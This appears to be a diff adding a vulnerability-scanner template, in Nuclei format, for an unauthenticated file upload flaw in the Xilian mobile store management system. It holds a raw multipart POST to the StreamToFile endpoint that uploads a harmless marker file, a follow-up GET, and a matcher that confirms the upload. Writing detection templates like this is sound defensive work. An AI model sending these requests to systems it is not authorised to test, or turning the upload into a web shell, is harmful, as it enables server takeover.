@@ -1,0 +1,44 @@
+id: xlrjmd-StreamToFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 西联软件-移动门店管理系统 StreamToFile 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /api/UploadDB/StreamToFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+        Content-Length: 915
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="organ"
+
+        test
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="devid"
+
+        ceshi
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="files";filename="1222.txt"
+        Content-Type: image/png
+
+        whoisceshi
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+      - |+
+        GET /Files/DB/test_ceshi.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
